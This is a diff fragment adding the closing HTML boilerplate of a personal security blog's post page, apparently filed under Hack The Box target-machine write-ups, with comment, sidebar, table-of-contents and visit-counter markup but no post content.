+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-03-21</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>-><a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/HTB/">HTB</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">#靶机</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
